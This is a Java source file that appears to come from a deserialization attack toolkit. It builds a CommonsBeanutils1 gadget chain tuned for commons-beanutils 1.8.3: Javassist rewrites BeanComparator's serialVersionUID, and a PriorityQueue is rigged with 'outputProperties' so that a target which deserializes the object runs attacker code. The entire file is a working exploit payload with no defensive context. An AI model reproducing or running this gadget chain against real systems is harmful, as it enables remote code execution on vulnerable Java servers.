package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.util.Gadgets;
import com.summersec.attack.deser.util.JavassistClassLoader;
import com.summersec.attack.deser.util.Reflections;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

//@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils1_183 implements ObjectPayload {
    @Override
    public Object getObject(Object templates) throws Exception {

        // 修改BeanComparator类的serialVersionUID
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(beanComparator, "property", "lowestSetBit");

        PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)beanComparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }

    public static void main(String[] args) throws Exception {
       CommonsBeanutils1_183 payload = new CommonsBeanutils1_183();
       payload.getObject(new Object());
    }
}



